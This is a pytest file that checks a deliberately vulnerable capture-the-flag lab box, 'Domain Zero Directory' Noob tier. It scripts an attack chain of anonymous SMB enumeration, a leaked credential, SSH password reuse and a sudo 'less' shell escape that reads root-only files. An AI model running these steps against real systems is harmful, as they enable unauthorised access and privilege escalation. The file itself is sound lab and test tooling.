"""Phase 11 verification: domainzero-noob-reception -- the Noob tier of
the new "Domain Zero Directory" game (a classic on-prem corporate
red-team engagement against the fictional "Meridian Systems"). First
box in the game, deliberately has no dependency on the Samba AD DC
work the rest of the game needs (see the plan file / memory for the
spike results) -- plain Samba file-server + SSH, exactly the shape of
noob-orientation-server, so both backends work with zero
backend-specific code.

10 real flags, climbing difficulty: anonymous SMB share enumeration
(flags 1-2) -> discovering an unlisted share by name (flag 3) -> a
leaked config backup with a weak password (flag 4) -> authenticating
to a restricted share with that password (flag 5) -> SSH foothold via
password reuse (flag 6) -> a sudo/GTFOBins ('less') privesc hint
(flag 7) -> reading a root-only file via the GTFOBins escape (flag 8)
-> a full root shell via the same escape (flags 9-10).

Real SMB, real SSH, a real privilege escalation -- no mocks. Requires
the box image already built (ctf-boxes/domainzero-noob-reception:latest),
`smbclient` and `sshpass` on PATH, and a running orchestrator reachable
at ORCHESTRATOR_TEST_URL.
"""
import hashlib
import hmac
import os
import secrets as pysecrets
import subprocess
import tempfile

import pytest
import requests

BASE_URL = os.environ.get("ORCHESTRATOR_TEST_URL", "http://127.0.0.1:9100")
BOX_ID = "domainzero-noob-reception"
_TEAM_ID_BASE = pysecrets.randbelow(1_000_000)

SVC_PASSWORD = "Reception2024!"  # fixed/narrative -- discoverable via the leaked config backup


def expected_flag(secret: str, n: int) -> str:
    digest = hmac.new(secret.encode(), f"{BOX_ID}:{n}".encode(), hashlib.sha256).hexdigest()
    return f"HLC{{{digest[:10]}}}"


def _port(inst: dict, container_port: int) -> int:
    for p in inst["ports"]:
        if p["container_port"] == container_port:
            return p["host_port"]
    raise AssertionError(f"no port {container_port} in instance ports: {inst['ports']}")


def _smb_get(host: str, smb_port: int, share: str, filename: str, user: str | None = None, password: str | None = None) -> str:
    with tempfile.TemporaryDirectory() as tmp:
        local_path = os.path.join(tmp, "out")
        auth = ["-N"] if user is None else ["-U", f"{user}%{password}"]
        cmd = ["smbclient", f"//{host}/{share}", "-p", str(smb_port), *auth, "-c", f"get {filename} {local_path}"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        assert result.returncode == 0, f"smbclient failed: {result.stdout} {result.stderr}"
        with open(local_path) as f:
            return f.read()


def _ssh(host: str, port: int, command: str, password: str = SVC_PASSWORD, timeout: float = 20.0):
    return subprocess.run(
        [
            "sshpass", "-p", password, "ssh",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
            "-p", str(port), f"svc_helpdesk@{host}", command,
        ],
        capture_output=True, text=True, timeout=timeout,
    )


def _escalate_via_less(host: str, port: int, shell_command: str) -> str:
    """The box's one intended privesc: svc_helpdesk has passwordless
    sudo on /usr/bin/less -- the classic GTFOBins `!<command>` shell
    escape from inside the pager, run as root."""
    script = f"!{shell_command}\nq\n"
    result = subprocess.run(
        [
            "sshpass", "-p", SVC_PASSWORD, "ssh", "-tt",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
            "-p", str(port), f"svc_helpdesk@{host}", "sudo less /etc/hostname",
        ],
        input=script, capture_output=True, text=True, timeout=20,
    )
    return result.stdout


@pytest.fixture(params=["docker", "kubernetes"])
def box_instance(request):
    backend = request.param
    team_id = _TEAM_ID_BASE + (1 if backend == "docker" else 2)
    secret = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id, "box_id": BOX_ID, "team_secret": secret, "backend": backend},
    )
    r.raise_for_status()
    inst = r.json()
    try:
        yield inst, secret, backend
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


def test_full_ten_flag_chain(box_instance):
    inst, secret, backend = box_instance
    host = inst["entry_host"]
    smb_port, ssh_port = _port(inst, 445), _port(inst, 22)

    # Flags 1-2: anonymous SMB enumeration of the public "reception" share.
    welcome = _smb_get(host, smb_port, "reception", "welcome.txt")
    assert expected_flag(secret, 1) in welcome
    staff = _smb_get(host, smb_port, "reception", "staff_directory.txt")
    assert expected_flag(secret, 2) in staff
    assert "ops-archive" in staff  # the hint pointing at the unlisted share

    # Flags 3-4: the unlisted "ops-archive" share, connected to directly by name.
    readme = _smb_get(host, smb_port, "ops-archive", "readme.txt")
    assert expected_flag(secret, 3) in readme
    backup = _smb_get(host, smb_port, "ops-archive", "backup_svc_config.xml.bak")
    assert expected_flag(secret, 4) in backup
    assert SVC_PASSWORD in backup  # the leaked credential

    # Flag 5: the restricted "secure-ops" share, using the leaked credential.
    memo = _smb_get(host, smb_port, "secure-ops", "internal_memo.txt", user="svc_helpdesk", password=SVC_PASSWORD)
    assert expected_flag(secret, 5) in memo

    # Flag 6: SSH foothold via the same reused credential.
    user_txt = _ssh(host, ssh_port, "cat user.txt")
    assert user_txt.returncode == 0, user_txt.stderr
    assert expected_flag(secret, 6) in user_txt.stdout

    # Flag 7: a hint file pointing at the sudo/GTFOBins privesc.
    notes = _ssh(host, ssh_port, "cat notes.txt")
    assert expected_flag(secret, 7) in notes.stdout
    sudo_l = _ssh(host, ssh_port, "sudo -l")
    assert "/usr/bin/less" in sudo_l.stdout

    # Flag 8: a root-only file, read via the GTFOBins escape before going for a full shell.
    log_output = _escalate_via_less(host, ssh_port, "cat /var/log/secure_ops.log")
    assert expected_flag(secret, 8) in log_output

    # Flags 9-10: full root shell via the same escape.
    root_output = _escalate_via_less(host, ssh_port, "cat /root/decommission_notes.txt /root/root.txt")
    assert expected_flag(secret, 9) in root_output
    assert expected_flag(secret, 10) in root_output


def test_idempotent_create(box_instance):
    inst, secret, backend = box_instance
    r = requests.post(
        f"{BASE_URL}/instances",
        json={
            "team_id": inst["team_id"], "box_id": BOX_ID, "team_secret": "a-different-secret-must-be-ignored",
            "backend": backend,
        },
    )
    r.raise_for_status()
    assert r.json()["instance_id"] == inst["instance_id"]


def test_cross_team_flag_isolation(box_instance):
    inst, secret, backend = box_instance
    team_id_b = inst["team_id"] + 1000
    secret_b = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id_b, "box_id": BOX_ID, "team_secret": secret_b, "backend": backend},
    )
    r.raise_for_status()
    inst_b = r.json()
    try:
        host_a, port_a = inst["entry_host"], _port(inst, 445)
        host_b, port_b = inst_b["entry_host"], _port(inst_b, 445)
        welcome_a = _smb_get(host_a, port_a, "reception", "welcome.txt")
        welcome_b = _smb_get(host_b, port_b, "reception", "welcome.txt")
        assert expected_flag(secret, 1) in welcome_a
        assert expected_flag(secret_b, 1) in welcome_b
        assert expected_flag(secret, 1) != expected_flag(secret_b, 1)
        assert expected_flag(secret, 1) not in welcome_b
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst_b['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")
